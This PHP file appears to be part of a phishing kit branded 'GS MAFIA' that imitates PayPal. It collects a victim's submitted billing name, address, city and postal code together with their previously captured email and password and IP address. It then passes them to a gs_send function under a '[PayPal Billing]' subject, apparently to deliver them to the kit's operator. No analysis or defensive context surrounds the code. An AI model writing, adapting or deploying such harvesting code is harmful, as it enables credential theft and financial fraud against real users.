<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("../gs_config.php");
$_SESSION['gs_billarray'] = $_POST;
$_SESSION['page'] = "bill";
$ip = getclientip();
$GS_SEND["E-Mail"] = "<span style='color:green'>".$_SESSION['gs_logarray']["gs_email"]."</span>";
$GS_SEND["Password"] = "<span style='color:green'>".$_SESSION['gs_logarray']["gs_password"]."</span>";
$GS_SEND["BLANKK1"] = "";
$GS_SEND["First Name"] = $_POST["gs_fname"];
$GS_SEND["Last Name"] = $_POST["gs_lname"];
$GS_SEND["Address"] = $_POST["gs_street1"];
$GS_SEND["City"] = $_POST["gs_city"];
$GS_SEND["Zip"] = $_POST["gs_postalCode"];
$GS_SEND["Country"] = $_SESSION['gs_country'];
gs_send($GS_SEND,"[PayPal Billing] | ".$ip." | ". $_SESSION['gs_logarray']["gs_email"]);
?>